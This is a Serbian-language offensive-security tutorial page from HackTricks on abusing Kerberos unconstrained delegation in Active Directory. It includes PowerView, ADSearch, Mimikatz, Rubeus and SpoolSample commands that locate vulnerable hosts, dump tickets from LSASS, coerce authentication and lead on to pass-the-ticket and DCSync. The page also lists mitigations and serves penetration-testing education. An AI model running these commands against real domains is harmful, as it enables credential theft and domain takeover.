# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Ovo je funkcija koju može postaviti Administrator domena na bilo koji **računar** unutar domena. Tada, svaki put kada se **korisnik prijavi** na računar, **kopija TGT-a** tog korisnika će biti **poslata unutar TGS-a** koji obezbeđuje DC **i sačuvana u memoriji u LSASS-u**. Dakle, ako imate administratorske privilegije na mašini, moći ćete da **izvršite dump karata i da se pretvarate da ste korisnici** na bilo kojoj mašini.

Dakle, ako se administrator domena prijavi na računar sa aktiviranom funkcijom "Unconstrained Delegation", i imate lokalne administratorske privilegije unutar te mašine, moći ćete da izvršite dump karte i da se pretvarate da ste Administrator domena bilo gde (domen privesc).

Možete **pronaći objekte računara sa ovom atributom** proveravajući da li atribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) sadrži [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). To možete uraditi sa LDAP filtrima ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što je ono što powerview radi:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Učitajte tiket Administratora (ili korisnika žrtve) u memoriju pomoću **Mimikatz** ili **Rubeus za** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Više informacija o nekontrolisanoj delegaciji na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Prisilna autentifikacija**

Ako napadač može da **kompromituje računar koji je dozvoljen za "Nekontrolisanu delegaciju"**, mogao bi da **prevari** **Print server** da se **automatski prijavi** protiv njega **čuvajući TGT** u memoriji servera.\
Tada bi napadač mogao da izvrši **Pass the Ticket napad da se pretvara** da je korisnički račun računara Print servera.

Da biste omogućili prijavu print servera protiv bilo koje mašine, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ako je TGT sa kontrolera domena, možete izvršiti [**DCSync napad**](acl-persistence-abuse/index.html#dcsync) i dobiti sve hešove sa DC-a.\
[**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Ovde pronađite druge načine da **prisilite autentifikaciju:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Ublažavanje

- Ograničite DA/Admin prijave na specifične usluge
- Postavite "Nalog je osetljiv i ne može biti delegiran" za privilegovane naloge.

{{#include ../../banners/hacktricks-training.md}}
